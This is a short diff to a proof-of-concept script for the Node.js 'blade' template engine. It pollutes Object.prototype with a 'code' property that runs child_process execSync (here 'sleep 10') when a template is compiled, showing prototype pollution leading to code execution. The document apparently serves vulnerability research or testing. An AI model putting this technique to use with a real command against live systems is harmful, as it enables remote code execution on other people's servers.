@@ -3,9 +3,10 @@ const blade = require('blade');
 /**
  * prototype pollution
  */
-// Object.prototype.name = "somename"
-// Object.prototype.value = "somevalue"
-// Object.prototype.code = "process.mainModule.require('child_process').execSync(\`touch a.txt\`)"
+Object.prototype.b = {}
+Object.prototype.b.name = "somename"
+Object.prototype.b.value = "somevalue"
+Object.prototype.b.code = "process.mainModule.require('child_process').execSync(\`sleep 10\`)"
 
 const template = `html
     head
@@ -19,12 +20,8 @@ const template = `html
         #content.center
             h1 Blade is cool`;
 
-// for node-find-undefined
-console.log("===========start===========")
-
 blade.compile(template, {'debug': true}, function(err, tmpl) {
     tmpl({'nav': []}, function(err, html) {
         console.log(html, err);
     });
 });
-console.log("===========end===========")
